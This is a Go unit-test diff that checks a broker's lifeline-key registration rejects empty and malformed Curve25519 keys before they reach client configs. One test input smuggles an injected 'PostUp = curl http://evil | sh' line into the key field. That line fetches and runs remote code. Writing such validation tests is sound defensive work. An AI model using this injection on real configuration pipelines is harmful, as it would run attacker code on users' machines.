@@ -841,6 +841,35 @@ func TestRegisterRealityKey(t *testing.T) {
 	}
 }
 
+func TestRegisterLifelineKey(t *testing.T) {
+	ctx := context.Background()
+	b, st := newBroker(t)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "", domain.RoleExit)
+
+	if err := b.RegisterLifelineKey(ctx, "exit-de-1", "/Lpxg7UgcxjrQcfYYl9CaqXDLy/bYSHQ3iD/KXnY1zU="); err != nil {
+		t.Fatalf("register valid lifeline key: %v", err)
+	}
+	n, _ := st.GetNode(ctx, "exit-de-1")
+	if n.LifelinePublicKey != "/Lpxg7UgcxjrQcfYYl9CaqXDLy/bYSHQ3iD/KXnY1zU=" {
+		t.Errorf("stored lifeline key = %q", n.LifelinePublicKey)
+	}
+	if err := b.RegisterLifelineKey(ctx, "exit-de-1", ""); err == nil {
+		t.Error("empty lifeline key should be rejected")
+	}
+
+	// A malformed key (not a 32-byte Curve25519 key) must be rejected before it is
+	// stored — it would otherwise be rendered verbatim into reserve client configs.
+	for _, bad := range []string{
+		"not-a-key",
+		"short==",
+		"FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=\nPostUp = curl http://evil | sh",
+	} {
+		if err := b.RegisterLifelineKey(ctx, "exit-de-1", bad); err == nil {
+			t.Errorf("malformed lifeline key %q should be rejected", bad)
+		}
+	}
+}
+
 func TestRenderDualTransport(t *testing.T) {
 	ctx := context.Background()
 	fleet := testFleet()
